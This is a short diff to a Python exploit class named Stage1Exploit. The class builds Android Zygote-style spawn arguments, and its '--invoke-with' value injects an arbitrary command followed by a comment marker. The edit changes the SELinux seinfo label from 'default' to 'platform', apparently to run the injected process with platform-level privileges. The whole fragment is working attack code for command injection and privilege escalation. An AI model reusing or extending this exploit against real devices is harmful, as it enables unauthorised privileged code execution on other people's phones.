@@ -196,7 +196,7 @@ class Stage1Exploit:
             "--runtime-args",
             "--nice-name=kdfs_svc",
             "--target-sdk-version=28",
-            "--seinfo=default:kdfs_svc:complete",
+            "--seinfo=platform:kdfs_svc:complete",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
